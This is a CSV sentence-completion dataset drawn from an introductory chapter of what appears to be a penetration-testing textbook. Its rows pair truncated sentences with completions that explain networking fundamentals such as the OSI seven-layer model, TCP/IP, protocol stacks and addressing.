sentence,answer
"after all , unless you are sitting at the computer you are attacking , which","after all , unless you are sitting at the computer you are attacking , which would be very uncommon , you ’ re going to be interacting with the network"
"in some cases , the different attacks , and cer - tainly","in some cases , the different attacks , and cer - tainly the defenses , will make use of networking technologies and communications protocols"
"to understand how networks function , it may be helpful to","to understand how networks function , it may be helpful to have a conceptual under- standing of how the protocols fit together"
"there is another way of describing these functions , sometimes called","there is another way of describing these functions , sometimes called a model but it ’ s more of an as-built architectural design"
"in this chapter , i ’ ll cover both the","in this chapter , i ’ ll cover both the open systems interconnection ( osi ) model and the tcp/ip architecture"
topologies are generally con- ceptual and can be used as a,topologies are generally con- ceptual and can be used as a way of logically organizing systems to see how they are con-nected
this will start us down the path of talking about,"this will start us down the path of talking about the physical elements of networks , including how they are addressed"
"ultimately , when we are networking systems , we","ultimately , when we are networking systems , we want them to be able to communicate with one another"
this refers back to the models mentioned earlier because the different,this refers back to the models mentioned earlier because the different addresses are ways of communicating with the different functions at different layers
"as we move up the network stacks from the physical components , we ’ ll start talk- ing about the protocols you are perhaps","as we move up the network stacks from the physical components , we ’ ll start talk- ing about the protocols you are perhaps most familiar with : internet protocol ( ip ) , transmission control protocol ( tcp ) , and user datagram protocol ( udp )"
these will be the foundational protocols you will need a solid understanding of for not only testing sys-tems,these will be the foundational protocols you will need a solid understanding of for not only testing sys-tems but also providing guidance as to how different vulnerabilities may be remediated by companies you are working for
"one common approach to providing information technology services in companies , especially if","one common approach to providing information technology services in companies , especially if the services are to external users or customers , is to use service providers"
making use of these service providers and working with organizations that have placed systems and,making use of these service providers and working with organizations that have placed systems and services with them introduces some specific challenges to someone performing security assessments or penetration tests
these addresses are best separated into buckets related to,these addresses are best separated into buckets related to the function-ality provided by the protocol each address belongs to
"the first communications model , from the standpoint of what we ’ ll be talking about but also","the first communications model , from the standpoint of what we ’ ll be talking about but also from the standpoint of history , meaning it essentially came first , is more conceptual than strictly practical"
"these communications models are broken into layers , and","these communications models are broken into layers , and the layers are stacked on top of one another"
"because it shows up as a stack of tiers , you","because it shows up as a stack of tiers , you will often hear them referred to as network stacks or protocol stacks"
one important aspect to consider when it comes to these network stacks,one important aspect to consider when it comes to these network stacks is that the layers are all separate and the functionality is distinct
"when two systems are talking , each has these notional layers , and layer c on the first sys-tem","when two systems are talking , each has these notional layers , and layer c on the first sys-tem can only talk to layer c , not layers b , a , or d , on the second system"
the layer/function that gen-erated this set of headers on the sending side,the layer/function that gen-erated this set of headers on the sending side can only be read by the same layer/function on the receiving side
you know what you should say or do and the,you know what you should say or do and the other side of the communication knows what the response is
"without these protocols , you could greet your acquaintance by sticking your little finger into","without these protocols , you could greet your acquaintance by sticking your little finger into your ear and the other person could remove a shoe and throw it at you"
this would be a protocol mismatch and neither of you would have any idea what,this would be a protocol mismatch and neither of you would have any idea what the appropriate response is because they don ’ t know what the initial communi-cation attempt meant
"as we go through the two communications models , i ’ ll talk about not only","as we go through the two communications models , i ’ ll talk about not only the functions that exist at each layer , but also the protocols that exist at each layer"
"when we ’ re done , you ’ ll have two different , but not dissimilar","when we ’ re done , you ’ ll have two different , but not dissimilar , ways of understanding how protocols commu-nicate across systems and how messages between systems/applications are put together"
"the same applications work over ethernet , for example ,","the same applications work over ethernet , for example , as the ones that travel over sonet or frame relay"
"this works because the functionality of each layer is abstracted , meaning layers can","this works because the functionality of each layer is abstracted , meaning layers can communicate with each other without needing to know the details because the functionality is known"
there are many different protocols for each of the,"there are many different protocols for each of the layers , no matter which model we are talking about"
"open systems interconnection prior to the late 1970s , communications systems","open systems interconnection prior to the late 1970s , communications systems used proprietary protocols , making it harder to conceptualize what was happening"
"in the late 1970s , the international organization for standardization ( iso","in the late 1970s , the international organization for standardization ( iso ) began a process to define a set of standards for communication"
"if all the functions are broken out conceptually , the interface","if all the functions are broken out conceptually , the interface points are clearer and , as such , easier to interact with"
while there were concerns about the complexity of this model and the chance that it was unlikely to,"while there were concerns about the complexity of this model and the chance that it was unlikely to be implemented , it remains a solid model to help refer to boundaries between functions within a network stack"
"when indicating a particular functionality , network professionals may","when indicating a particular functionality , network professionals may make reference to the function by the layer number"
"in talking about the model , we typi- cally start at","in talking about the model , we typi- cally start at the ground floor and work our way up to the penthouse"
2 the seven layers of the osi model application presentation session transport network data link physical since we build messages from the,"2 the seven layers of the osi model application presentation session transport network data link physical since we build messages from the application layer down , we ’ re going to start discuss- ing each of the layers and their roles there and move downward"
"for what it ’ s worth , though , the various mnemonics that","for what it ’ s worth , though , the various mnemonics that are often used to help people remember the different layers start at the bottom"
"for example , one of my students once suggested “ please do","for example , one of my students once suggested “ please do not touch steve ’ s pet alligator ” to help remember the order"
"regardless , if you remember either order and then can remember what","regardless , if you remember either order and then can remember what each of the layers does , you ’ ll be in good shape"
presentation ( layer 6 ) the presentation layer,presentation ( layer 6 ) the presentation layer is responsible for preparing data for the application layer
it makes sure that the data that is handed up to,it makes sure that the data that is handed up to the application is in the right format so it can be consumed
"when systems are communicating , there may be disconnects in formatting between the","when systems are communicating , there may be disconnects in formatting between the two endpoints and the presentation layer makes sure that data is formatted correctly"
"additionally , the joint photographic experts group ( jpeg","additionally , the joint photographic experts group ( jpeg ) format is considered to be at the presentation layer"
session ( layer 5 ) the session layer manages the communication between the endpoints when,session ( layer 5 ) the session layer manages the communication between the endpoints when it comes to maintaining the communication of the applications ( the client or server )
there are components of file sharing that also live at the session,"there are components of file sharing that also live at the session layer , since negotiation of com-munication between the endpoints needs to take place"
the application layer takes care of managing the resources while the session layer takes care,"the application layer takes care of managing the resources while the session layer takes care of making sure that files , as an example , are successfully transmitted and complete"
these protocols use ports for address-ing so receiving,these protocols use ports for address-ing so receiving systems know which application to pass the traffic to
